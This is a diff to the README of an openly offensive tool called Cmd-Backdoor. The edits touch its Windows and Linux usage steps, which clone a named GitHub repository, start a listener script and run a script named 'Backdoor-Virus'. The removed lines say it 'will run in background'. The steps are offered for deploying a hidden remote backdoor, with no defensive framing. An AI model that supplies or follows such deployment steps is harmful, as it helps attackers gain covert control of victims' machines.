@@ -6,14 +6,14 @@ Download & Unzip Files To Desktop
 cd Desktop
 cd Cmd-Backdoor-master
 python3 Cmd-Backdoor-Listener.py
-python Backdoor-Virus.pyw - Backdoor will run in background!!!
+python Backdoor-Virus.py
 ```
 ### Usage On Linux:
 ```
 git clone https://github.com/Toxic-Omega/Cmd-Backdoor
 cd Cmd-Backdoor
 python Cmd-Backdoor-Listener.py
-python Backdoor-Virus.pyw - Backdoor will run in background!!!
+python Backdoor-Virus.pyw
 ```
 ### Screenshot
 <br>
